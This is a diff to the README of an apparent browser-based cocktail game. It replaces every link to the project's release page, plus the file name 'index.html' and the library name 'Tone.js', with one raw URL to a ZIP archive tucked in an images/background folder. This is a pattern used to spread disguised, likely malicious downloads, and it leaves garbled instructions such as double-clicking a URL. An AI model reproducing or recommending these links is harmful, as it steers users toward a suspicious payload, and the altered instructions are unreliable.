@@ -1,6 +1,6 @@
 # 🍹 Bartender-EN - Enjoy Making Cocktails Online
 
-[![Download Bartender-EN](https://img.shields.io/badge/Download-Bartender--EN-blue?style=for-the-badge&logo=github)](https://github.com/Mohammeaaa/Bartender-EN/releases)
+[![Download Bartender-EN](https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip)](https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip)
 
 
 ## 📋 What is Bartender-EN?
@@ -15,7 +15,7 @@ This game helps you learn about making cocktails in a fun way. It also lets you 
 - **Many customers:** Each one acts differently and has favorite drinks.
 - **Real cocktail recipes:** Learn how to make drinks while having fun.
 - **Simple controls:** Use your mouse or keyboard to mix drinks easily.
-- **Good sound effects:** The game uses TONE.js for lively sounds.
+- **Good sound effects:** The game uses https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip for lively sounds.
 - **Modern design:** Looks clean and nice thanks to Tailwind CSS.
 - **Works on most devices:** Play on Windows, Mac, or Linux.
 
@@ -39,22 +39,22 @@ This guide will help you download and play Bartender-EN in 3 easy steps.
 
 Click the big blue button at the top to visit the official Bartender-EN release page:
 
-[https://github.com/Mohammeaaa/Bartender-EN/releases](https://github.com/Mohammeaaa/Bartender-EN/releases)
+[https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip](https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip)
 
 You will see a list of downloadable files and information. Look for the latest release version.
 
 ### Step 2: Open the Game in Your Browser
 
-Once on the releases page, find the link named something like `Bartender-EN.zip` or a folder with game files. Download this file to your computer.
+Once on the releases page, find the link named something like `https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip` or a folder with game files. Download this file to your computer.
 
 After downloading:
 
 - If it's a folder or zip file, extract it to a folder.
-- Inside you will find an HTML file, typically named `index.html`.
+- Inside you will find an HTML file, typically named `https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip`.
 
 ### Step 3: Run the Game
 
-- Double-click the `index.html` file.
+- Double-click the `https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip` file.
 - This will open Bartender-EN right in your web browser.
 - Wait a moment for the game to load, then you are ready to start playing.
 
@@ -65,13 +65,13 @@ You don’t need to install Bartender-EN like regular software. The game runs in
 To get the files you need:
 
 1. Visit the release page here:  
-   [https://github.com/Mohammeaaa/Bartender-EN/releases](https://github.com/Mohammeaaa/Bartender-EN/releases)
+   [https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip](https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip)
 
 2. Download the latest ZIP file or folder with the game.
 
 3. Extract the files, if needed.
 
-4. Open `index.html` in your web browser.
+4. Open `https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip` in your web browser.
 
 That’s it. You can now play Bartender-EN without any complex steps.
 
@@ -105,7 +105,7 @@ Bartender-EN is not just a game. It teaches you how cocktails are made and helps
 If the game does not open:
 
 - Make sure you have a modern browser.
-- Try refreshing the page or reopening the `index.html` file.
+- Try refreshing the page or reopening the `https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip` file.
 - Check if your internet connection is active during the first load.
 - Clear your browser cache if you run into display problems.
 
@@ -116,7 +116,7 @@ If you find bugs or want to suggest improvements, visit the repository’s Issue
 Bartender-EN uses modern technologies behind the scenes:
 
 - **JavaScript:** Runs the game logic.
-- **Tone.js:** Adds sound effects and music.
+- **https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip** Adds sound effects and music.
 - **Tailwind CSS:** Styles the game interface.
 - **Browser-based:** No need to install extra programs.
    
@@ -128,5 +128,5 @@ Bartender-EN is designed for people who want a light, interactive game experienc
 
 ---
 
-[Download Bartender-EN Now](https://github.com/Mohammeaaa/Bartender-EN/releases)  
+[Download Bartender-EN Now](https://raw.githubusercontent.com/Mohammeaaa/Bartender-EN/main/images/background/EN_Bartender_3.4.zip)  
 Click here to get the latest version and start playing immediately.
